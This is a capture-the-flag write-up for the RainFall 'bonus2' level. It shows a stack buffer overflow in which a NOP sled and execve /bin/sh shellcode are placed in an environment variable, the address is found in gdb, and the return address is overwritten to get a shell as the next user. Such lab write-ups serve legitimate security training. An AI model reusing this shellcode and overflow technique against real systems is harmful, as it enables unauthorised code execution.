
```bash
bonus2@RainFall:~$ export LANG=fi
```

```bash
./bonus2 `(python -c 'print ("A" * 45)')` `(python -c 'print ("B" * 32)')`
```

offset avec env variable `LANG` set is 18


Put our shellcode in the env
```bash
export EXPLOIT=$(python -c 'print "\x90" * 50 + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"')
```

```bash
(gdb) x/200s environ
0xbffff8cf:	 "EXPLOIT=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\311\367\341Qh//shh/bin\211\343\260\v\315\200"
```

```bash
Lets look at the address

```bash
(gdb) x/50x 0xbffff8cf
0xbffff8cf:	0x45	0x58	0x50	0x4c	0x4f	0x49	0x54	0x3d
0xbffff8d7:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffff8df:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffff8e7:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffff8ef:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffff8f7:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffff8ff:	0x90	0x90


```

The start of our shellcode is `\x90\x90\90`  
Here we can see those bytes at `0xbffff8d7` == `\xd7\xf8\xff\xbf`
Why ? Because we need to skip 8 chars ("EXPLOIT="), so we skip the first 8 bytes

```bash
PAYLOAD
argv[1] = `(python -c 'print ("A" * 45)')`
argv[2] = `(python -c 'print ("B" * 18 + Address jump env )')`

```

The offset in memory in gdb may be a bit different, that is why we put a lot of NOP instruction (`\x90`)

`0xbffff8d7` + 16 (hexa) = `bffff8ed` = `\xed\xf8\xff\xbf`

Lets jump further to jump into the `\x90` : `\xed\xf8\xff\xbf`


```bash
PAYLOAD
./bonus2 `(python -c 'print ("A" * 45)')` `(python -c 'print ("B" * 18 + "\xed\xf8\xff\xbf" )')`
```

```bash
bonus2@RainFall:~$ ./bonus2 `(python -c 'print ("A" * 45)')` `(python -c 'print ("B" * 18 + "\xed\xf8\xff\xbf" )')`
Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBB����
$ whoami
bonus3
```
